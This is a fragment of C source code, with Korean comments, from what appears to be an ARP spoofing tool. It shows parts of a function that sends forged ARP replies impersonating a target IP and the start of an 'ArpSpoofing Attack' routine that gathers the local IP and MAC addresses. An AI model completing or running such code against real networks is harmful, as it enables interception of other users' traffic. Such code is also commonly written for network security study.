...
int ArpReply(pcap_t* handle, uint8_t* mac, Mac query_mac, char* snder_ip, char* target_ip) { //ARP Reply 발송
    ...
    s_packet->arp_.sip_ = htonl(Ip(target_ip));
...
int ArpSpoofing(char* dev, char* snder_ip, char* target_ip) { //ArpSpoofing Attack
    Mac query_mac; //알고자 하는 mac address 저장
    char MyIp[20];              //나의 IP 저장 변수
    getMy_IP(MyIp, dev);    //나의 IP
    uint8_t MyMac[6];           //나의 MAC 저장 변수
    getMacAddress(MyMac, dev); //나의 MAC
